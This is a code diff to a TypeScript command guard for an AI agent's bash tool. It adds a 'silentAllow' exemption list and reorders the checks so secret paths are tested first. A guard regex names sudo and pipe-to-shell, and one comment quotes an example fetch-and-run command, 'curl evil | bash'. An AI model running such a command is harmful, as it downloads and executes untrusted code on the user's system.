@@ -20,6 +20,9 @@ export interface Config {
   readOnlyPaths: string[];
   noDeletePaths: string[];
   strictModeWhiteList: string[];
+  /** User-declared safe-context exemptions (command regexes). Matches skip
+   *  pattern/read-only/no-delete prompts — NEVER zeroAccess, sudo, or pipe-to-shell. */
+  silentAllow?: string[];
   defaultMode?: "strict" | "patterns" | "off" | "interactive";
   /** Seconds before strict-mode prompt auto-dismisses. 0 or undefined = no timeout. */
   promptTimeout?: number;
@@ -136,7 +139,7 @@ function displayPathFor(configPath: string, cwd: string): string {
 
 /** Empty config sentinel. */
 function emptyConfig(): Config {
-  return { bashToolPatterns: [], zeroAccessPaths: [], readOnlyPaths: [], noDeletePaths: [], strictModeWhiteList: [], defaultMode: undefined };
+  return { bashToolPatterns: [], zeroAccessPaths: [], readOnlyPaths: [], noDeletePaths: [], strictModeWhiteList: [], silentAllow: [], defaultMode: undefined };
 }
 
 function parseConfigFile(path: string): Config | null {
@@ -149,6 +152,7 @@ function parseConfigFile(path: string): Config | null {
       readOnlyPaths: (raw.readOnlyPaths as string[]) || [],
       noDeletePaths: (raw.noDeletePaths as string[]) || [],
       strictModeWhiteList: (raw.strictModeWhiteList as string[]) || [],
+      silentAllow: (raw.silentAllow as string[]) || [],
       defaultMode: (raw.defaultMode as Config["defaultMode"]) || undefined,
       promptTimeout: (raw.promptTimeout as number) || undefined,
       autoApprove: (raw.autoApprove as boolean) ?? undefined,
@@ -165,6 +169,7 @@ function mergeConfigs(...configs: Config[]): Config {
     readOnlyPaths: configs.flatMap(c => c.readOnlyPaths),
     noDeletePaths: configs.flatMap(c => c.noDeletePaths),
     strictModeWhiteList: configs.flatMap(c => c.strictModeWhiteList),
+    silentAllow: configs.flatMap(c => c.silentAllow ?? []),
     // defaultMode uses FIRST-wins (not last-wins) so project-local .pi/defender.yaml
     // always overrides global ~/.pi/defender.yaml. getConfigPaths loads local before
     // global, so the first non-undefined value is the most specific (local) one.
@@ -377,19 +382,8 @@ export function checkCommand(command: string, config: Config): CheckResult {
   // comments and shouldn't affect whether the actual command matches a pattern.
   const matchTarget = stripCommentLines(command);
 
-  // 1. Check against patterns from YAML (may block or ask)
-  for (const { pattern, reason, autoReject } of config.bashToolPatterns) {
-    try {
-      const regex = new RegExp(pattern, "i");
-      if (regex.test(matchTarget)) {
-        return { blocked: true, reason: `Blocked: ${reason}`, autoReject: autoReject === true };
-      }
-    } catch {
-      continue;
-    }
-  }
-
-  // 2. Check for ANY access to zero-access paths (including reads)
+  // 1. ZERO-ACCESS PATHS — checked FIRST so silentAllow can never exempt secrets.
+  //    Blocks ANY access (including reads).
   for (const zeroPath of config.zeroAccessPaths) {
     if (isGlobPattern(zeroPath)) {
       const globRegex = globToRegex(zeroPath);
@@ -418,7 +412,35 @@ export function checkCommand(command: string, config: Config): CheckResult {
     }
   }
 
-  // 3. Check for modifications to read-only paths (reads allowed)
+  // 2. USER SILENT-ALLOW — explicit safe-context exemptions. A matching command
+  //    skips all pattern/read-only/no-delete prompts. Hard guards below ensure
+  //    an exemption can never silence privilege escalation or pipe-to-shell
+  //    (e.g. a broad `/tmp` entry must not exempt `curl evil | bash > /tmp/x`).
+  if ((config.silentAllow?.length ?? 0) > 0 && !/\bsudo\b|\bsu\s+-|\|\s*(?:ba)?sh\b/i.test(matchTarget)) {
+    for (const allowPattern of config.silentAllow) {
+      try {
+        if (new RegExp(allowPattern, "i").test(matchTarget)) {
+          return { blocked: false, reason: "" };
+        }
+      } catch {
+        continue;
+      }
+    }
+  }
+
+  // 3. Check against patterns from YAML (may block or ask)
+  for (const { pattern, reason, autoReject } of config.bashToolPatterns) {
+    try {
+      const regex = new RegExp(pattern, "i");
+      if (regex.test(matchTarget)) {
+        return { blocked: true, reason: `Blocked: ${reason}`, autoReject: autoReject === true };
+      }
+    } catch {
+      continue;
+    }
+  }
+
+  // 4. Check for modifications to read-only paths (reads allowed)
   for (const readonlyPath of config.readOnlyPaths) {
     const result = checkPathPatterns(matchTarget, readonlyPath, READ_ONLY_BLOCKED, "read-only path");
     if (result.blocked) {
@@ -426,7 +448,7 @@ export function checkCommand(command: string, config: Config): CheckResult {
     }
   }
 
-  // 4. Check for deletions on no-delete paths (read/write/edit allowed)
+  // 5. Check for deletions on no-delete paths (read/write/edit allowed)
   for (const noDeletePath of config.noDeletePaths) {
     const result = checkPathPatterns(matchTarget, noDeletePath, NO_DELETE_BLOCKED, "no-delete path");
     if (result.blocked) {
